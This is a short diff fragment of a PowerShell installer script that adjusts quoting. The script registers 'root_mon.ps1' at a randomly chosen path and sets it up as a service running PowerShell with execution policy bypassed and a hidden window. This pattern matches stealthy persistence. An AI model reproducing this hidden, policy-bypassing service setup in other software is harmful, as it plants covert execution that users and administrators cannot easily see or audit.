@@ -21,7 +21,7 @@ if(($scriptPath -eq $null) -or ($scriptPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $scriptPath = $paths[$idx]
     $scriptPath = "$scriptPath\root_mon.ps1"
-    Set-ItemProperty -Path $basePath -Name $propertyName -Value $scriptPath -Force | Out-Null
+    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $scriptPath -Force | Out-Null
 }
 
 if(($rootPath -eq $null) -or ($rootPath -eq "")){
@@ -31,7 +31,7 @@ if(($rootPath -eq $null) -or ($rootPath -eq "")){
 
 $serviceName = "MyRootMonService"
 $exePath = "powershell.exe"
-$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath $rootPath -basePath ""$basePath"""
+$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath $rootPath -basePath '$basePath'"
 $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
